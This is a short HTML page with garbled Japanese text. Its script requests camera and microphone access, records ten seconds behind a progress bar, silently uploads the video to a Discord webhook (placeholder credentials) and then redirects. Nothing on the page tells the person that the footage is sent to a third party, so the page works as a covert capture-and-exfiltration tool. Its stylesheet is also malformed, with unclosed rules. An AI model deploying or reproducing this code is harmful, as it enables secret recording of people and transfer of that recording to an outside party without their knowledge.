<html>
<head>

  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;

    #progressText {
      font-size: 24px;
      margin-bottom: 10px;
    }
    #progressBar {
      width: 80%;

  </style>

<body>

<div id="progressText">éŒ²ç”»ä¸­... 0%</div>
<div id="progressBar">
  <div id="progressFill"></div>
</div>

<script>
  const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // â† å®Ÿéš›ã®Webhookã«ç½®ãæ›ãˆã¦ï¼

  const durationMs = 10000; // 10ç§’
  const updateInterval = 100; // 0.1ç§’ã”ã¨æ›´æ–°ï¼ˆãªã‚ã‚‰ã‹ï¼‰
  const totalSteps = durationMs / updateInterval;

  const progressText = document.getElementById("progressText");
  const progressFill = document.getElementById("progressFill");

  navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
    const chunks = [];

    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.onstop = () => {
      const blob = new Blob(chunks, { type: "video/webm" });
      const file = new File([blob], "recorded.webm");

      const formData = new FormData();
      formData.append("file", file);
      formData.append("content", "ğŸ¥ éŒ²ç”»ã—ãŸå‹•ç”»ã§ã™");

      fetch(webhookUrl, {
        method: "POST",
        body: formData
      }).then(() => {
        window.location.href = "recorded.html"; // â† é€ä¿¡å¾Œã«ç§»å‹•
      });
    };

    mediaRecorder.start();

    // ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³é€²è¡Œ
    let currentStep = 0;
    const interval = setInterval(() => {
      currentStep++;
      const percentage = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
      progressText.textContent = `éŒ²ç”»ä¸­... ${percentage}%`;
      progressFill.style.width = `${percentage}%`;

      if (currentStep >= totalSteps) {
        clearInterval(interval);
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }
    }, updateInterval);
  }).catch(err => {
    alert("ã‚«ãƒ¡ãƒ©ãƒ»ãƒã‚¤ã‚¯ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒæ‹’å¦ã•ã‚Œã¾ã—ãŸï¼š" + err);
  });
</script>
